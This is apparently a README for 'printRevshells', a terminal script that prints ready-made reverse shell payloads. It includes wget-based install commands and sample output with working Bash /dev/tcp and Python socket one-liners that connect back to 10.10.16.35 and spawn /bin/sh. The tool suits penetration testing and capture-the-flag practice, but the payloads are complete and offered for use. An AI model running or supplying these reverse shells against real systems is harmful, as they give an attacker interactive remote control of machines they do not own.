## Revshells

### Purpose
Got sick of looking for the same payloads every time you want to pop a reverse shell? This simple script will print via the terminal the most common revshell payloads you can find on the web.

There are plenty of payloads online but this script includes:
- Bash
- Python
- Netcat
- Perl
- PHP

The script is easily customizable so you can add your own payloads aswell


### Installation
```
sudo wget https://raw.githubusercontent.com/shroudri/printRevshells/main/printRevshells -O /usr/local/bin/printRevshells
sudo chmod +x /usr/local/bin/printRevshells
username=$(whoami)
sudo chown $username /usr/local/bin/printRevshells

```

### Port 

By default, **if no arguments are provided**, the script will use 9001 as the default port. You can customize this easily on the script.

However, if you want to specify your own port, you can execute the script as follows.
```
printRevshells 1234
```

Which generates the following output:

```
Bash
bash -i >& /dev/tcp/10.10.16.35/1234 0>&1

Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.35",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([/bin/sh,-i]);'
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.35",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([/bin/sh,-i]);'
.....
```
